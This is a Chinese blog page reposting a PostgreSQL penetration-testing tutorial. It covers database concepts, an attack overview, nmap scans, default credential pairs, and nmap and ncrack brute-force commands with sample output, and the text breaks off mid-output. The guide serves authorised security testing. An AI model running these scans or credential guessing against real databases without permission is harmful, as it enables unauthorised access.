<!doctype html><html lang=zh-CH><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>PostgreSQL Pentesting - 杂货铺</title><meta name=Description content="杂七杂八的，随手记录。"><meta property="og:url" content="https://yangyingchao.github.io/2025/12/postgresql-pentesting/"><meta property="og:site_name" content="杂货铺"><meta property="og:title" content="PostgreSQL Pentesting"><meta property="og:description" content="Table of Contents 1 Reminder - definitions 提醒 - 定义 2 数据库渗透测试 - 攻击列表 3 如何通过网络 TCP 端口扫描定位 PostgreSQL 数据库 4 如何执行暴力攻击以识别有效的 PostgreSQL 数据库凭证（登录名和密码） 4.1 NMAP - ‘pgsql-brute’ module (https://nmap.org) 4.2 * NCRACK tool (https://nmap.org/ncrack/) 4.3 * Metasploit - ‘postgres_login’ module (https://www.metasploit.com) 5 如何检测数据库是否存在已知的未修复的漏洞（例如，是否为过时的数据库版本、缺少安全补丁） 5.1 Metasploit 的“PostgreSQL Version Probe”模块 5.2 使用 SearchSploit 在 ExploitDB 数据库中查找公开的漏洞利用方法 5.3 查看 Metasploit 为 PostgreSQL 提供的可用模块和漏洞利用程序。 6 如何使用有效凭证登录 PostgreSQL 数据库 6.1 * PostgreSQL client 6.2 DbVisualizer (GUI multi-database client; https://dbvis.com) 6.3 * Metasploit - ‘PostgreSQL Server Generic Query’ module 7 如何识别并利用数据库和操作系统权限提升漏洞 7.1 检查各种有用信息（比如用户列表、数据库密码策略、谁是数据管理员等） 7.2 数据库和操作系统提升权限 - 使用“从程序复制（COPY FROM PROGRAM）”执行操作系统命令 7.3 数据库和操作系统提升权限 本文为摘录(或转载)，侵删，原文为： https://hackviser.com/tactics/pentesting/services/postgresql"><meta property="og:locale" content="zh_CH"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-10T00:00:00+00:00"><meta property="article:tag" content="Pentest"><meta property="article:tag" content="Penetration"><meta property="article:tag" content="Shentou"><meta property="article:tag" content="Pg"><meta property="og:image" content="https://yangyingchao.github.io/logo.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangyingchao.github.io/logo.png"><meta name=twitter:title content="PostgreSQL Pentesting"><meta name=twitter:description content="Table of Contents 1 Reminder - definitions 提醒 - 定义 2 数据库渗透测试 - 攻击列表 3 如何通过网络 TCP 端口扫描定位 PostgreSQL 数据库 4 如何执行暴力攻击以识别有效的 PostgreSQL 数据库凭证（登录名和密码） 4.1 NMAP - ‘pgsql-brute’ module (https://nmap.org) 4.2 * NCRACK tool (https://nmap.org/ncrack/) 4.3 * Metasploit - ‘postgres_login’ module (https://www.metasploit.com) 5 如何检测数据库是否存在已知的未修复的漏洞（例如，是否为过时的数据库版本、缺少安全补丁） 5.1 Metasploit 的“PostgreSQL Version Probe”模块 5.2 使用 SearchSploit 在 ExploitDB 数据库中查找公开的漏洞利用方法 5.3 查看 Metasploit 为 PostgreSQL 提供的可用模块和漏洞利用程序。 6 如何使用有效凭证登录 PostgreSQL 数据库 6.1 * PostgreSQL client 6.2 DbVisualizer (GUI multi-database client; https://dbvis.com) 6.3 * Metasploit - ‘PostgreSQL Server Generic Query’ module 7 如何识别并利用数据库和操作系统权限提升漏洞 7.1 检查各种有用信息（比如用户列表、数据库密码策略、谁是数据管理员等） 7.2 数据库和操作系统提升权限 - 使用“从程序复制（COPY FROM PROGRAM）”执行操作系统命令 7.3 数据库和操作系统提升权限 本文为摘录(或转载)，侵删，原文为： https://hackviser.com/tactics/pentesting/services/postgresql"><meta name=application-name content="杂货铺"><meta name=apple-mobile-web-app-title content="杂货铺"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://yangyingchao.github.io/2025/12/postgresql-pentesting/><link rel=prev href=https://yangyingchao.github.io/2025/12/database-penetration-testing/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"PostgreSQL Pentesting","inLanguage":"zh-CH","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/yangyingchao.github.io\/2025\/12\/postgresql-pentesting\/"},"image":["https:\/\/yangyingchao.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"pentest, penetration, shentou, pg","wordcount":7125,"url":"https:\/\/yangyingchao.github.io\/2025\/12\/postgresql-pentesting\/","datePublished":"2025-12-10T00:00:00+00:00","dateModified":"2025-12-10T00:00:00+00:00","publisher":{"@type":"Organization","name":"xxxx","logo":{"@type":"ImageObject","url":"https:\/\/yangyingchao.github.io\/images\/avatar.jpg","width":160,"height":160}},"author":{"@type":"Person","name":"yc"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=杂货铺><span class=header-title-pre><i class='fa-solid fa-house-chimney'></i></span>老杨的杂货铺</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>所有文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=https://github.com/yangyingchao title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=杂货铺><span class=header-title-pre><i class='fa-solid fa-house-chimney'></i></span>老杨的杂货铺</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>所有文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=https://github.com/yangyingchao title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PostgreSQL Pentesting</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>yc</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2025-12-10>2025-12-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 7125 字&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 15 分钟&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#reminder-definitions-提醒-定义><span class=section-num>1</span> Reminder - definitions 提醒 - 定义</a></li><li><a href=#数据库渗透测试-攻击列表><span class=section-num>2</span> 数据库渗透测试 - 攻击列表</a></li><li><a href=#如何通过网络-tcp-端口扫描定位-postgresql-数据库><span class=section-num>3</span> 如何通过网络 TCP 端口扫描定位 PostgreSQL 数据库</a></li><li><a href=#如何执行暴力攻击以识别有效的-postgresql-数据库凭证-登录名和密码><span class=section-num>4</span> 如何执行暴力攻击以识别有效的 PostgreSQL 数据库凭证（登录名和密码）</a><ul><li><a href=#nmap-pgsql-brute-module--https-nmap-dot-org><span class=section-num>4.1</span> NMAP - ‘pgsql-brute’ module (https://nmap.org)</a></li><li><a href=#ncrack-tool--https-nmap-dot-org-ncrack><span class=section-num>4.2</span> * NCRACK tool (https://nmap.org/ncrack/)</a></li><li><a href=#metasploit-postgres-login-module--https-www-dot-metasploit-dot-com><span class=section-num>4.3</span> * Metasploit - ‘postgres_login’ module (https://www.metasploit.com)</a></li></ul></li><li><a href=#如何检测数据库是否存在已知的未修复的漏洞-例如-是否为过时的数据库版本-缺少安全补丁><span class=section-num>5</span> 如何检测数据库是否存在已知的未修复的漏洞（例如，是否为过时的数据库版本、缺少安全补丁）</a><ul><li><a href=#metasploit-的-postgresql-version-probe-模块><span class=section-num>5.1</span> Metasploit 的“PostgreSQL Version Probe”模块</a></li><li><a href=#使用-searchsploit-在-exploitdb-数据库中查找公开的漏洞利用方法><span class=section-num>5.2</span> 使用 SearchSploit 在 ExploitDB 数据库中查找公开的漏洞利用方法</a></li><li><a href=#查看-metasploit-为-postgresql-提供的可用模块和漏洞利用程序><span class=section-num>5.3</span> 查看 Metasploit 为 PostgreSQL 提供的可用模块和漏洞利用程序。</a></li></ul></li><li><a href=#如何使用有效凭证登录-postgresql-数据库><span class=section-num>6</span> 如何使用有效凭证登录 PostgreSQL 数据库</a><ul><li><a href=#postgresql-client><span class=section-num>6.1</span> * PostgreSQL client</a></li><li><a href=#dbvisualizer--gui-multi-database-client-https-dbvis-dot-com><span class=section-num>6.2</span> DbVisualizer (GUI multi-database client; https://dbvis.com)</a></li><li><a href=#metasploit-postgresql-server-generic-query-module><span class=section-num>6.3</span> * Metasploit - ‘PostgreSQL Server Generic Query’ module</a></li></ul></li><li><a href=#如何识别并利用数据库和操作系统权限提升漏洞><span class=section-num>7</span> 如何识别并利用数据库和操作系统权限提升漏洞</a><ul><li><a href=#检查各种有用信息-比如用户列表-数据库密码策略-谁是数据管理员等><span class=section-num>7.1</span> 检查各种有用信息（比如用户列表、数据库密码策略、谁是数据管理员等）</a><ul><li><a href=#一些有趣的标志><span class=section-num>7.1.1</span> 一些有趣的标志</a></li><li><a href=#user-related><span class=section-num>7.1.2</span> User Related:</a></li><li><a href=#to-display-the-privileges-of-a-specific-suer><span class=section-num>7.1.3</span> To display the privileges of a specific suer</a></li><li><a href=#useful-sql-queries><span class=section-num>7.1.4</span> Useful SQL queries</a></li><li><a href=#default-roles><span class=section-num>7.1.5</span> Default Roles</a></li><li><a href=#role-attributes><span class=section-num>7.1.6</span> Role Attributes</a></li><li><a href=#list-of-roles-users><span class=section-num>7.1.7</span> List of roles/users</a></li><li><a href=#metasploit-postgres-schema-dump-module><span class=section-num>7.1.8</span> Metasploit - ‘Postgres Schema Dump’ module</a></li><li><a href=#audit-tool-postgresql-stig-compliance-validator--pgstigcheck><span class=section-num>7.1.9</span> Audit Tool - PostgreSQL STIG Compliance Validator (pgStigCheck)</a></li></ul></li><li><a href=#数据库和操作系统提升权限-使用-从程序复制-copy-from-program-执行操作系统命令><span class=section-num>7.2</span> 数据库和操作系统提升权限 - 使用“从程序复制（COPY FROM PROGRAM）”执行操作系统命令</a><ul><li><a href=#manual-exploit><span class=section-num>7.2.1</span> Manual exploit</a></li><li><a href=#metasploit-postgresql-copy-from-program-command-execution-module><span class=section-num>7.2.2</span> Metasploit - ‘PostgreSQL COPY FROM PROGRAM Command Execution’ module</a></li><li><a href=#psql-mass-rce-script--https-github-dot-com-attackercan-psql-mass-rce><span class=section-num>7.2.3</span> PSQL-MASS-RCE script (https://github.com/attackercan/psql-mass-rce)</a></li></ul></li><li><a href=#数据库和操作系统提升权限><span class=section-num>7.3</span> 数据库和操作系统提升权限</a><ul><li><a href=#set-up-the-environments><span class=section-num>7.3.1</span> Set up the environments</a></li><li><a href=#manual-exploit><span class=section-num>7.3.2</span> Manual exploit</a></li><li><a href=#metasploit-postgres-readfile-module><span class=section-num>7.3.3</span> Metasploit - ‘postgres_readfile’ module</a></li></ul></li></ul></li></ul></nav></div></div><div class=content id=content><div class="ox-hugo-toc toc has-section-numbers"><div class=heading>Table of Contents</div><ul><li><span class=section-num>1</span> <a href=#reminder-definitions-%e6%8f%90%e9%86%92-%e5%ae%9a%e4%b9%89 rel>Reminder - definitions 提醒 - 定义</a></li><li><span class=section-num>2</span> <a href=#%e6%95%b0%e6%8d%ae%e5%ba%93%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95-%e6%94%bb%e5%87%bb%e5%88%97%e8%a1%a8 rel>数据库渗透测试 - 攻击列表</a></li><li><span class=section-num>3</span> <a href=#%e5%a6%82%e4%bd%95%e9%80%9a%e8%bf%87%e7%bd%91%e7%bb%9c-tcp-%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%e5%ae%9a%e4%bd%8d-postgresql-%e6%95%b0%e6%8d%ae%e5%ba%93 rel>如何通过网络 TCP 端口扫描定位 PostgreSQL 数据库</a></li><li><span class=section-num>4</span> <a href=#%e5%a6%82%e4%bd%95%e6%89%a7%e8%a1%8c%e6%9a%b4%e5%8a%9b%e6%94%bb%e5%87%bb%e4%bb%a5%e8%af%86%e5%88%ab%e6%9c%89%e6%95%88%e7%9a%84-postgresql-%e6%95%b0%e6%8d%ae%e5%ba%93%e5%87%ad%e8%af%81-%e7%99%bb%e5%bd%95%e5%90%8d%e5%92%8c%e5%af%86%e7%a0%81 rel>如何执行暴力攻击以识别有效的 PostgreSQL 数据库凭证（登录名和密码）</a><ul><li><span class=section-num>4.1</span> <a href=#nmap-pgsql-brute-module--https-nmap-dot-org rel>NMAP - &lsquo;pgsql-brute&rsquo; module (https://nmap.org)</a></li><li><span class=section-num>4.2</span> <a href=#ncrack-tool--https-nmap-dot-org-ncrack rel>* NCRACK tool (https://nmap.org/ncrack/)</a></li><li><span class=section-num>4.3</span> <a href=#metasploit-postgres-login-module--https-www-dot-metasploit-dot-com rel>* Metasploit - &lsquo;postgres_login&rsquo; module (https://www.metasploit.com)</a></li></ul></li><li><span class=section-num>5</span> <a href=#%e5%a6%82%e4%bd%95%e6%a3%80%e6%b5%8b%e6%95%b0%e6%8d%ae%e5%ba%93%e6%98%af%e5%90%a6%e5%ad%98%e5%9c%a8%e5%b7%b2%e7%9f%a5%e7%9a%84%e6%9c%aa%e4%bf%ae%e5%a4%8d%e7%9a%84%e6%bc%8f%e6%b4%9e-%e4%be%8b%e5%a6%82-%e6%98%af%e5%90%a6%e4%b8%ba%e8%bf%87%e6%97%b6%e7%9a%84%e6%95%b0%e6%8d%ae%e5%ba%93%e7%89%88%e6%9c%ac-%e7%bc%ba%e5%b0%91%e5%ae%89%e5%85%a8%e8%a1%a5%e4%b8%81 rel>如何检测数据库是否存在已知的未修复的漏洞（例如，是否为过时的数据库版本、缺少安全补丁）</a><ul><li><span class=section-num>5.1</span> <a href=#metasploit-%e7%9a%84-postgresql-version-probe-%e6%a8%a1%e5%9d%97 rel>Metasploit 的“PostgreSQL Version Probe”模块</a></li><li><span class=section-num>5.2</span> <a href=#%e4%bd%bf%e7%94%a8-searchsploit-%e5%9c%a8-exploitdb-%e6%95%b0%e6%8d%ae%e5%ba%93%e4%b8%ad%e6%9f%a5%e6%89%be%e5%85%ac%e5%bc%80%e7%9a%84%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%96%b9%e6%b3%95 rel>使用 SearchSploit 在 ExploitDB 数据库中查找公开的漏洞利用方法</a></li><li><span class=section-num>5.3</span> <a href=#%e6%9f%a5%e7%9c%8b-metasploit-%e4%b8%ba-postgresql-%e6%8f%90%e4%be%9b%e7%9a%84%e5%8f%af%e7%94%a8%e6%a8%a1%e5%9d%97%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e7%a8%8b%e5%ba%8f rel>查看 Metasploit 为 PostgreSQL 提供的可用模块和漏洞利用程序。</a></li></ul></li><li><span class=section-num>6</span> <a href=#%e5%a6%82%e4%bd%95%e4%bd%bf%e7%94%a8%e6%9c%89%e6%95%88%e5%87%ad%e8%af%81%e7%99%bb%e5%bd%95-postgresql-%e6%95%b0%e6%8d%ae%e5%ba%93 rel>如何使用有效凭证登录 PostgreSQL 数据库</a><ul><li><span class=section-num>6.1</span> <a href=#postgresql-client rel>* PostgreSQL client</a></li><li><span class=section-num>6.2</span> <a href=#dbvisualizer--gui-multi-database-client-https-dbvis-dot-com rel>DbVisualizer (GUI multi-database client; https://dbvis.com)</a></li><li><span class=section-num>6.3</span> <a href=#metasploit-postgresql-server-generic-query-module rel>* Metasploit - &lsquo;PostgreSQL Server Generic Query&rsquo; module</a></li></ul></li><li><span class=section-num>7</span> <a href=#%e5%a6%82%e4%bd%95%e8%af%86%e5%88%ab%e5%b9%b6%e5%88%a9%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e5%92%8c%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87%e6%bc%8f%e6%b4%9e rel>如何识别并利用数据库和操作系统权限提升漏洞</a><ul><li><span class=section-num>7.1</span> <a href=#%e6%a3%80%e6%9f%a5%e5%90%84%e7%a7%8d%e6%9c%89%e7%94%a8%e4%bf%a1%e6%81%af-%e6%af%94%e5%a6%82%e7%94%a8%e6%88%b7%e5%88%97%e8%a1%a8-%e6%95%b0%e6%8d%ae%e5%ba%93%e5%af%86%e7%a0%81%e7%ad%96%e7%95%a5-%e8%b0%81%e6%98%af%e6%95%b0%e6%8d%ae%e7%ae%a1%e7%90%86%e5%91%98%e7%ad%89 rel>检查各种有用信息（比如用户列表、数据库密码策略、谁是数据管理员等）</a></li><li><span class=section-num>7.2</span> <a href=#%e6%95%b0%e6%8d%ae%e5%ba%93%e5%92%8c%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e6%8f%90%e5%8d%87%e6%9d%83%e9%99%90-%e4%bd%bf%e7%94%a8-%e4%bb%8e%e7%a8%8b%e5%ba%8f%e5%a4%8d%e5%88%b6-copy-from-program-%e6%89%a7%e8%a1%8c%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%91%bd%e4%bb%a4 rel>数据库和操作系统提升权限 - 使用“从程序复制（COPY FROM PROGRAM）”执行操作系统命令</a></li><li><span class=section-num>7.3</span> <a href=#%e6%95%b0%e6%8d%ae%e5%ba%93%e5%92%8c%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e6%8f%90%e5%8d%87%e6%9d%83%e9%99%90 rel>数据库和操作系统提升权限</a></li></ul></li></ul></div><p>本文为摘录(或转载)，侵删，原文为： <a href=https://hackviser.com/tactics/pentesting/services/postgresql target=_blank rel="noopener noreffer">https://hackviser.com/tactics/pentesting/services/postgresql</a></p><h2 id=reminder-definitions-提醒-定义><span class=section-num>1</span> Reminder - definitions 提醒 - 定义</h2><ul><li><strong>模式（SCHEMA）</strong><br>PostgreSQL 的模式用来存放除了角色和表空间之外的所有对象，类似于命名空间的结构，允许同名对象在同一个数据库中共存，方便管理不同来源或用途的表和函数等。默认情况下，每次创建新的数据库都会含有一个叫做“public”的模式，但实际上还可以添加更多的模式，而且“public”模式的存在并不是必须的。<ul><li><p><strong>表（TABLES）</strong><br>数据库存储数据的最基本单元就是表，数据以行、列的形式被组织起来。</p></li><li><p><strong>视图（VIEWS）</strong><br>视图是由一条查询语句定义而成的虚拟表，在查询的时候从相关的原表中动态地提取出数据，并不是直接存储数据的实体。 视图是一种可以被使用直到被删除的字典对象，不过视图本身一般是不可更新的。</p></li><li><p><strong>用户</strong><br>PostgreSQL 数据库的默认超级管理员账户。拥有对数据库中的所有对象拥有极高的权限。</p></li><li><p><strong>默认角色（DEFAULT ROLES）</strong><br>PostgreSQL 设置了一系列默认角色。这些角色通常属于访问某些数据库的特权功能和私有信息所必须的，以便处理常规的、需要高权限的任务。数据库管理员可以根据需要将这些默认角色授予数据库中的用户或者其他自定义的第三方角色，从而允许这些用户和角色访问这些特权功能和信息。</p></li></ul></li></ul><ul><li><p>面向过程的语言（PROCEDURAL LANGUAGES）</p><ul><li>流程性语言允许开发人员通过自定义子例程（函数）来扩展数据库，这些通常被称为存储过程。*</li><li>语言被分为两组：<ul><li>用保证安全的语言编写的过程是沙盒化的，任何用户都可以安全地创建和使用。</li><li>用不安全的语言编写的过程只能由超级用户创建，因为它们允许绕过数据库的安全限制，但也可以访问数据库外的资源。像 Perl 这样的有些语言同时提供了安全版和不安全版。</li></ul></li><li>PostgreSQL 内置支持三种过程性语言：<ul><li>纯 SQL（安全的）</li><li>PostgreSQL 过程语言（PL/pgSQL）（安全的）</li><li>C（不安全的）。</li></ul></li><li>PostgreSQL 允许通过扩展将过程语言装入数据库。<br>PostgreSQL 自带三种语言扩展以支持 Perl、Python 和 Tcl。</li></ul></li><li><p>身份验证机制（AUTHENTICATION MECHANISMS）<br>PostgreSQL 原生支持大量的外部身份验证机制，包括以下方式：</p><ul><li><em>密码</em> ：可以使用 SCRAM-SHA-256（从 PostgreSQL 10 开始提供）、MD5 或纯文本方式。</li><li><em>通用安全服务应用程序编程接口（GSSAPI）</em></li><li><em>安全支持提供程序接口（SSPI）</em></li><li><em>Kerberos</em></li><li><em>ident</em> （把由 ident 服务器提供的操作系统用户名映射为数据库用户名）</li><li><em>Peer</em> （将本地用户名映射到数据库用户名）</li><li><em>轻量级目录访问协议（LDAP）</em></li><li><em>Active Directory（活动目录，AD）</em></li><li><em>RADIUS</em></li><li><em>证书</em></li><li><em>可插拔的身份验证模块（PAM）</em></li></ul><p>这些方法是在集群的基于主机的身份验证配置文件（pg_hba.conf）中指定的，它会确定哪些连接是被允许的。这允许控制哪个用户能够连接到哪个数据库，他们可以从哪里连接（IP 地址、IP 地址范围、域套接字），将执行哪种身份验证系统，以及连接是否必须使用传输层安全（TLS）。</p></li></ul><h2 id=数据库渗透测试-攻击列表><span class=section-num>2</span> 数据库渗透测试 - 攻击列表</h2><ul><li><p><strong>黑盒渗透测试（从未经授权的攻击者到可以登录数据库的用户）</strong><br></p><ul><li><em>尝试暴力攻击，来检测是否存在默认的或者容易猜到的数据库用户名密码。</em></li><li><em>在可以连接到 PostgreSQL 数据库的 Web 应用程序中，检测是否存在 SQL 注入漏洞，能让我们运行未经授权的 SQL 查询语句。</em></li><li><em>攻击了一台服务器，在里面发现了硬编码在脚本、配置文件、.bash_history 文件或者应用程序源代码里的明文
PostgreSQL 数据库账号密码。</em></li><li><em>运行针对 PostgreSQL 数据库的远程漏洞利用代码（0 day 漏洞，或者这个数据库缺少相应漏洞修复补丁）。</em></li><li><em>经过中间人攻击，意外截获了明文或者已经被哈希加密的账号密码（比如通过 ARP 缓存投毒的方式）。</em></li></ul></li><li><p><strong>灰盒渗透测试（提升权限，成为数据库管理员或者在数据库所在的服务器操作系统上运行任意操作系统命令）</strong><br>灰盒测试一般意味着测试者有一定程度的系统访问权限。这种测试主要是尝试提升现有的权限，比如从普通数据库用户权限提升为数据库管理员权限，或者不仅仅是控制数据库，还想通过对数据库的操作来影响到支撑
PostgreSQL 数据库的服务器操作系统，比如执行一些操作系统级别的命令，进行服务器内部的横向移动等操作，具体的测试方法依赖于数据库的配置、漏洞以及系统的细节情况而有所不同，不能像黑盒测试部分那样列出一招一式的具体攻击手法，需要根据实际情况灵活发挥技术水平。</p></li></ul><h2 id=如何通过网络-tcp-端口扫描定位-postgresql-数据库><span class=section-num>3</span> 如何通过网络 TCP 端口扫描定位 PostgreSQL 数据库</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pentester@KaliLinux&gt; nmap -Pn -sS -sV -vv -p 5432 IP-address
</span></span><span class=line><span class=cl>pentester@KaliLinux&gt; nmap -v -Pn -sS -sV -p- 192.168.75.149
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Example:
</span></span><span class=line><span class=cl>        Nmap scan report for 192.168.1.104
</span></span><span class=line><span class=cl>        Host is up (0.00044s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        PORT      STATE SERVICE     VERSION
</span></span><span class=line><span class=cl>        5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5
</span></span><span class=line><span class=cl>        |_ssl-date: TLS randomness does not represent time
</span></span></code></pre></td></tr></table></div></div><h2 id=如何执行暴力攻击以识别有效的-postgresql-数据库凭证-登录名和密码><span class=section-num>4</span> 如何执行暴力攻击以识别有效的 PostgreSQL 数据库凭证（登录名和密码）</h2><ul><li><em>默认数据库管理员账户及密码</em> ：=postgres：postgres=（用户名是=postgres=，密码也是=postgres=）</li><li><em>其他常见账号密码</em><ul><li>=admin：admin=（用户名是 admin，密码也是 admin）</li><li>=admin：postgres=（用户名是 admin，密码是 postgres）</li><li>=admin：password=（用户名是 admin，密码是 password）</li></ul></li></ul><h3 id=nmap-pgsql-brute-module--https-nmap-dot-org><span class=section-num>4.1</span> NMAP - &lsquo;pgsql-brute&rsquo; module (<a href=https://nmap.org target=_blank rel="noopener noreffer">https://nmap.org</a>)</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pentester@KaliLinux&gt; nmap -p 5432 --script pgsql-brute &lt;host&gt;
</span></span><span class=line><span class=cl>Script Output
</span></span><span class=line><span class=cl>5432/tcp open  pgsql
</span></span><span class=line><span class=cl>| pgsql-brute:
</span></span><span class=line><span class=cl>|   postgres:postgres =&gt; Valid credentials
</span></span><span class=line><span class=cl>|_  test:test =&gt; Valid credentials
</span></span></code></pre></td></tr></table></div></div><h3 id=ncrack-tool--https-nmap-dot-org-ncrack><span class=section-num>4.2</span> * NCRACK tool (<a href=https://nmap.org/ncrack/ target=_blank rel="noopener noreffer">https://nmap.org/ncrack/</a>)</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>ncrack</span> <span class=n>psql</span><span class=p>:</span><span class=o>//</span><span class=n>sqlserver</span> <span class=o>-</span><span class=n>u</span> <span class=n>postgres</span> <span class=o>-</span><span class=n>P</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span><span class=n>warning</span><span class=p>:</span> <span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span> <span class=n>does</span> <span class=ow>not</span> <span class=n>contain</span> <span class=n>by</span> <span class=n>default</span> <span class=s1>&#39;postgres&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>root</span><span class=err>@</span><span class=n>Security</span><span class=o>-</span><span class=n>Audit</span><span class=o>-</span><span class=mi>01</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>pentester</span><span class=c1># ncrack psql://192.168.1.26 -u postgres -P /usr/share/wordlists/rockyou2.txt</span>
</span></span><span class=line><span class=cl><span class=n>Starting</span> <span class=n>Ncrack</span> <span class=mf>0.7</span> <span class=p>(</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>ncrack</span><span class=o>.</span><span class=n>org</span> <span class=p>)</span> <span class=n>at</span> <span class=mi>2020</span><span class=o>-</span><span class=mi>03</span><span class=o>-</span><span class=mi>20</span> <span class=mi>02</span><span class=p>:</span><span class=mi>22</span> <span class=n>CET</span>
</span></span><span class=line><span class=cl><span class=n>Stats</span><span class=p>:</span> <span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>06</span> <span class=n>elapsed</span><span class=p>;</span> <span class=mi>0</span> <span class=n>services</span> <span class=n>completed</span> <span class=p>(</span><span class=mi>1</span> <span class=n>total</span><span class=p>)</span>
